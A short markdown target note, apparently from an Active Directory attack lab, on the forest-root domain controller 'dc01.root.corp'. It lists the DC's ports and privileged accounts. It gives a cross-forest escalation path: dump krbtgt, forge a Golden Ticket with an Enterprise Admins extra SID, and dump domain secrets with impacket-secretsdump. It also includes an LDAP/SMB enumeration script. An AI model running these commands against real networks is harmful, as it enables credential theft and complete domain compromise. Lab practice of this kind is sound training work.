# dc01.root.corp — 10.30.0.10

Forest root of `root.corp`. **Enterprise Admin target.** Tree-root trust with `corp.local`.

## Listening ports

Standard DC: 53, 88, 135, 137-139, 389, 445, 464, 636, 3268-3269, 3389, 5985, 9389. No anon-LDAP / null-pipe relaxation wired here — you usually arrive with a TGT.

## Users / groups

- `odin`
- `root_adm` — **Schema Admins, Enterprise Admins, Root Admins**
- Trust account `root.corp$` password reset deterministically

## Path to here

You reach `root.corp` after compromising `corp.local`:

1. Become DA on `corp.local` (any Pattern A-F).
2. Dump krbtgt of `corp.local`.
3. Forge Golden TGT with `/extra-sid:S-1-5-21-ROOT-519` (Enterprise Admins of root).
4. `impacket-secretsdump -k -no-pass -just-dc -target-ip 10.30.0.10 root.corp/Administrator@dc01.root.corp`.

## Minimum enum sweep

```bash
R=10.30.0.10
# After Golden TGT cross-forest:
export KRB5CCNAME=Administrator.ccache
nxc smb,ldap $R -k --use-kcache
ldapsearch -x -H ldap://$R -Y GSSAPI \
    -b "DC=root,DC=corp" "(memberOf=CN=Enterprise Admins,CN=Users,DC=root,DC=corp)"
```

## Forward to

DF-005/006/037 (cross-forest finalize), DF-040 (cross-forest persistence).
